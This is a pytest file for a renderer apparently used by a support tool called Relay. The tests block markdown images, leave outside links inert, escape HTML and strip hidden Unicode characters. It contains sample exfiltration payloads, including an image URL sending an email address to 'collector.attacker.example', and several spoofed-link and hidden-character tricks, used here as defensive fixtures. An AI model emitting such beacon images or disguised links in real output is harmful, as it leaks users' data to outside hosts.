"""Rendering text Relay did not write (4.26.0, ADR-032). Expected HTML is written out by hand."""

import pytest

from relay.api import suggestion_view
from relay.models import User
from relay.render import host_of, is_relay_link, render_text, strip_hidden

BASE = "https://relay.example/ws-support"
MEMBER = User(3, "cy@example.com", "Cy", "Member", "UTC")
GUEST = User(4, "dee@example.com", "Dee", "Guest", "UTC", frozenset({11}))


def test_the_incident_image_is_never_rendered_and_its_host_is_shown():
    text = "Customer reports a login loop. ![status](https://collector.attacker.example/p.png?d=ann%40example.com)"
    out = render_text(text, BASE)
    assert out.html == "Customer reports a login loop. [image not shown: collector.attacker.example]"
    assert out.images_removed == ("collector.attacker.example",)
    assert "<img" not in out.html


def test_an_image_pointing_into_relay_is_not_rendered_either():
    out = render_text(f"![logo]({BASE}/logo.png)", BASE)
    assert out.html == "[image not shown: relay.example]"


def test_a_relay_link_is_clickable_and_an_outside_link_is_inert_text():
    link = f"{BASE}/projects/10/tasks/7"
    out = render_text(f"See [the task]({link}) or [our status page](https://status.attacker.example/x?q=1)", BASE)
    assert out.html == (f'See <a href="{link}" rel="noopener noreferrer">the task</a> or '
                        '<span class="external-address">our status page (status.attacker.example)</span>')
    assert out.external == ("https://status.attacker.example/x?q=1",)


def test_a_relay_address_with_a_query_string_or_a_user_part_is_not_clickable():
    assert not is_relay_link(f"{BASE}/projects/10?next=https://attacker.example", BASE)
    assert not is_relay_link("https://relay.example/ws-support@attacker.example/x", BASE)
    assert not is_relay_link("https://relay.example.attacker.example/ws-support/x", BASE)
    assert is_relay_link(f"{BASE}/projects/10/tasks/7", BASE)
    assert not is_relay_link(f"{BASE}/../../redirect", BASE)        # dot-segments leave the workspace
    assert not is_relay_link(f"{BASE}/projects/%2e%2e/x", BASE)      # and so do encoded ones


def test_bare_addresses_are_shown_but_not_linked_and_html_is_escaped():
    out = render_text("<b>urgent</b> go to www.attacker.example/a", BASE)
    assert out.html == ('&lt;b&gt;urgent&lt;/b&gt; go to '
                        '<span class="external-address">www.attacker.example/a</span>')


def test_hidden_characters_are_removed_and_counted():
    text = "Pay​ now⁦⁩ \U000e0041\U000e0042 please⠀"
    clean, removed = strip_hidden(text)
    assert clean == "Pay now  please" and removed == 6
    assert render_text(text, BASE).hidden_removed == 6


def test_host_of_reads_scheme_less_and_user_part_addresses():
    assert host_of("https://Attacker.Example:8443/x") == "attacker.example"
    assert host_of("https://someone@attacker.example/x") == "attacker.example"
    assert host_of("www.attacker.example/a") == "www.attacker.example"
    assert host_of("") == "?"


def test_suggestion_view_renders_the_summary_and_says_what_it_removed():
    result = {"suggestion": {"category": "access", "priority": "P2", "team": "identity", "confidence": 0.8},
              "summary": "Login loop after SSO change. ![x](https://collector.attacker.example/p.png)"}
    view = suggestion_view(result, MEMBER, BASE)
    assert view["summary_html"] == "Login loop after SSO change. [image not shown: collector.attacker.example]"
    assert view["notice"] == "1 image(s) not shown"
    assert view["applies_to_task"] is False and view["priority"] == "P2"


def test_suggestion_view_reports_a_refused_summary_and_refuses_guests():
    result = {"suggestion": {"category": "bug", "priority": "P3", "team": "platform", "confidence": 0.7},
              "summary_refused": "address"}
    view = suggestion_view(result, MEMBER, BASE)
    assert view["summary_html"] is None and view["notice"] == "address"
    with pytest.raises(PermissionError):
        suggestion_view(result, GUEST, BASE)
